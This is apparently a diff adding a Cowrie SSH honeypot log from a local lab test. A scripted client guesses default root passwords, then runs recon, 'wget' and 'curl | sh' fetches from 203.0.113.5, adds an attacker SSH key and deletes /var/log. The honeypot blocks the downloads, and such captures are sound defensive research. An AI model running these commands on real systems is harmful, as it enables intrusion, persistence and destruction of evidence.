@@ -1,0 +1,62 @@
+2026-09-20T15:11:26.662642Z [cowrie.core.config#info] Reading configuration from ['etc/cowrie.cfg']
+2026-09-20T15:11:27.886247Z [cowrie.plugin#info] Python Version 3.12.3 (main, Aug 31 2026, 10:18:26) [GCC 13.3.0]
+2026-09-20T15:11:27.886328Z [cowrie.plugin#info] Twisted Version 26.4.0
+2026-09-20T15:11:27.886363Z [cowrie.plugin#info] Cowrie Version 0.1.dev1+gddd97e970
+2026-09-20T15:11:27.886390Z [cowrie.plugin#info] Sensor UUID: c9f610e8-b4f4-11f1-afe5-000c290362c1
+2026-09-20T15:11:27.891062Z [cowrie.core.output#info] Loaded output engine: jsonlog
+2026-09-20T15:11:27.896103Z [twisted.scripts._twistd_unix.UnixAppLogger#info] twistd 26.4.0 (/home/r/cowrie-lab/cowrie-env/bin/python 3.12.3) starting up.
+2026-09-20T15:11:27.896329Z [twisted.scripts._twistd_unix.UnixAppLogger#info] reactor class: twisted.internet.epollreactor.EPollReactor.
+2026-09-20T15:11:27.917391Z [-] CowrieSSHFactory starting on 2222
+2026-09-20T15:11:27.919765Z [cowrie.ssh.factory.CowrieSSHFactory#info] Starting factory <cowrie.ssh.factory.CowrieSSHFactory object at 0x73466fe17f50>
+2026-09-20T15:11:28.495532Z [cowrie.ssh.factory.CowrieSSHFactory#info] Ready to accept SSH connections
+2026-09-20T15:11:35.475075Z [ssh,2f11d2552b73,127.0.0.1] New connection: 127.0.0.1:42618 (127.0.0.1:2222) [session: 2f11d2552b73]
+2026-09-20T15:11:35.476946Z [ssh,2f11d2552b73,127.0.0.1] Remote SSH version: SSH-2.0-paramiko_5.0.0
+2026-09-20T15:11:35.482069Z [ssh,2f11d2552b73,127.0.0.1] SSH client hassh fingerprint: 6372ee6957562199b2fb773b0be1bf34
+2026-09-20T15:11:35.765461Z [ssh,2f11d2552b73,127.0.0.1] login attempt [root/root] failed
+2026-09-20T15:11:36.772076Z [ssh,3677ffce311d,127.0.0.1] New connection: 127.0.0.1:42626 (127.0.0.1:2222) [session: 3677ffce311d]
+2026-09-20T15:11:36.773201Z [ssh,3677ffce311d,127.0.0.1] Remote SSH version: SSH-2.0-paramiko_5.0.0
+2026-09-20T15:11:36.776243Z [ssh,3677ffce311d,127.0.0.1] SSH client hassh fingerprint: 6372ee6957562199b2fb773b0be1bf34
+2026-09-20T15:11:36.826308Z [ssh,3677ffce311d,127.0.0.1] login attempt [root/123456] failed
+2026-09-20T15:11:37.833932Z [ssh,ca9ab54c88ed,127.0.0.1] New connection: 127.0.0.1:42642 (127.0.0.1:2222) [session: ca9ab54c88ed]
+2026-09-20T15:11:37.835191Z [ssh,ca9ab54c88ed,127.0.0.1] Remote SSH version: SSH-2.0-paramiko_5.0.0
+2026-09-20T15:11:37.838410Z [ssh,ca9ab54c88ed,127.0.0.1] SSH client hassh fingerprint: 6372ee6957562199b2fb773b0be1bf34
+2026-09-20T15:11:37.887789Z [ssh,ca9ab54c88ed,127.0.0.1] login attempt [root/password] succeeded
+2026-09-20T15:11:37.888407Z [HoneyPotSSHTransport,2,127.0.0.1] Initialized emulated server as architecture: linux-x64-lsb
+2026-09-20T15:11:37.893133Z [HoneyPotSSHTransport,2,127.0.0.1] channel open
+2026-09-20T15:11:37.899027Z [SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,2,127.0.0.1] Handling pty request: b'vt100' (24, 80, 0, 0)
+2026-09-20T15:11:37.899892Z [ssh,ca9ab54c88ed,127.0.0.1] Terminal Size: 80 24
+2026-09-20T15:11:37.903154Z [SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,2,127.0.0.1] Getting shell
+2026-09-20T15:11:38.914420Z [ssh,ca9ab54c88ed,127.0.0.1] CMD: uname -a
+2026-09-20T15:11:38.932041Z [HoneyPotSSHTransport,2,127.0.0.1] Command found: uname -a
+2026-09-20T15:11:40.415342Z [ssh,ca9ab54c88ed,127.0.0.1] CMD: whoami
+2026-09-20T15:11:40.422451Z [HoneyPotSSHTransport,2,127.0.0.1] Command found: whoami 
+2026-09-20T15:11:41.916903Z [ssh,ca9ab54c88ed,127.0.0.1] CMD: cat /etc/passwd
+2026-09-20T15:11:41.927420Z [HoneyPotSSHTransport,2,127.0.0.1] Command found: cat /etc/passwd
+2026-09-20T15:11:43.417981Z [ssh,ca9ab54c88ed,127.0.0.1] CMD: ls -la /root
+2026-09-20T15:11:43.431368Z [HoneyPotSSHTransport,2,127.0.0.1] Command found: ls -la /root
+2026-09-20T15:11:44.923642Z [ssh,ca9ab54c88ed,127.0.0.1] CMD: wget http://203.0.113.5/bot.sh -O /tmp/bot.sh
+2026-09-20T15:11:44.939698Z [HoneyPotSSHTransport,2,127.0.0.1] Command found: wget http://203.0.113.5/bot.sh -O /tmp/bot.sh
+2026-09-20T15:11:44.941977Z [HoneyPotSSHTransport,2,127.0.0.1] Attempt to access blocked network address
+2026-09-20T15:11:46.421792Z [ssh,ca9ab54c88ed,127.0.0.1] CMD: chmod +x /tmp/bot.sh
+2026-09-20T15:11:46.434689Z [HoneyPotSSHTransport,2,127.0.0.1] Command found: chmod +x /tmp/bot.sh
+2026-09-20T15:11:47.930045Z [ssh,ca9ab54c88ed,127.0.0.1] CMD: echo 'ssh-rsa AAAAB3Nza attacker@evil' >> ~/.ssh/authorized_keys
+2026-09-20T15:11:47.946642Z [HoneyPotSSHTransport,2,127.0.0.1] Command found: echo ssh-rsa AAAAB3Nza attacker@evil
+2026-09-20T15:11:49.426971Z [ssh,ca9ab54c88ed,127.0.0.1] CMD: curl -s http://203.0.113.5/x | sh
+2026-09-20T15:11:49.445879Z [HoneyPotSSHTransport,2,127.0.0.1] Command found: curl -s http://203.0.113.5/x
+2026-09-20T15:11:49.447465Z [HoneyPotSSHTransport,2,127.0.0.1] Attempt to access blocked network address
+2026-09-20T15:11:49.448385Z [HoneyPotSSHTransport,2,127.0.0.1] Command found: sh 
+2026-09-20T15:11:50.926715Z [ssh,ca9ab54c88ed,127.0.0.1] CMD: rm -rf /var/log/*
+2026-09-20T15:11:50.938995Z [HoneyPotSSHTransport,2,127.0.0.1] Command found: rm -rf /var/log/*
+2026-09-20T15:11:52.425778Z [ssh,ca9ab54c88ed,127.0.0.1] CMD: exit
+2026-09-20T15:11:52.432557Z [HoneyPotSSHTransport,2,127.0.0.1] Command found: exit 
+2026-09-20T15:11:52.433850Z [HoneyPotSSHTransport,2,127.0.0.1] exitCode: 0
+2026-09-20T15:11:52.435861Z [ssh,ca9ab54c88ed,127.0.0.1] Closing TTY Log: var/lib/cowrie/tty/3a55160f4af4cf99f3e91f911638a78a93c1110f6fd125bcbee5afde58c00487 after 14532 milliseconds
+2026-09-20T15:11:52.436244Z [HoneyPotSSHTransport,2,127.0.0.1] sending close 0
+2026-09-20T15:11:52.479939Z [HoneyPotSSHTransport,2,127.0.0.1] remote close
+2026-09-20T15:11:53.934887Z [HoneyPotSSHTransport,1,127.0.0.1] connection lost
+2026-09-20T15:11:53.937788Z [ssh,3677ffce311d,127.0.0.1] Connection lost after 17163 milliseconds
+2026-09-20T15:11:53.949010Z [HoneyPotSSHTransport,2,127.0.0.1] avatar root logging out
+2026-09-20T15:11:53.949559Z [HoneyPotSSHTransport,2,127.0.0.1] connection lost
+2026-09-20T15:11:53.950109Z [ssh,ca9ab54c88ed,127.0.0.1] Connection lost after 16116 milliseconds
+2026-09-20T15:11:53.977172Z [HoneyPotSSHTransport,0,127.0.0.1] connection lost
+2026-09-20T15:11:53.978171Z [ssh,2f11d2552b73,127.0.0.1] Connection lost after 18502 milliseconds
